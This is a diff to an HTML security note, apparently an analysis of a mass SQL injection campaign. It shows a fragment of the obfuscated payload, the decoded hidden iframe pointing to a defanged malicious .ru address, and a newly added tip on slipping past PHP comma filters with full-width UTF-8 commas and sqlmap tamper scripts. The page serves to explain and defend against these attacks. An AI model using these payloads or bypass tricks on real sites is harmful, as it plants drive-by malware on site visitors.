@@ -59,4 +59,11 @@ dEcLArE @T vaRchaR(255),@c vARCHAr(255) decLAre tabLE_cUrsOR CURSOR FoR SELECt A
 We now realize there is a second CAST command present in the SQL sentence. Further decoding shows the following URL (modified http to hxxp to avoid clicking):<br/>
 &lt;iframe src="hxxp://nemohuildiin.ru/tds/go.php?sid=1" &nbsp;width="0" height="0" style="display:none"&gt;&lt;/iframe&gt; <br/>
 <br/>
-This attack will try to update every varchar column in your database to append the iframe text shown. This has been a massive and successful attack. If you look into google for the iframe, you can notice many affected sites.</body></html>
+This attack will try to update every varchar column in your database to append the iframe text shown. This has been a massive and successful attack. If you look into google for the iframe, you can notice many affected sites.<br/>
+<br/>
+<br/>
+<br/>
+<b>Obfuscating with UTF-8</b>: <a href="https://medium.com/@Wflki/sql-injection-oracle-and-full-width-characters-13bb86fc034a">https://medium.com/@Wflki/sql-injection-oracle-and-full-width-characters-13bb86fc034a</a>&nbsp;<br/>
+Needed to bypass PHP comma filtering, but still get commas to the vulnerable SQL database. Was found that UTF-8 FULL-WIDTH COMMA was able to bypass the filtering while still being acceptable to SQL. <br/>
+Can use sqlmap tamper scripts or otherwise to help automate these kinds of replacements. <br/>
+</body></html>
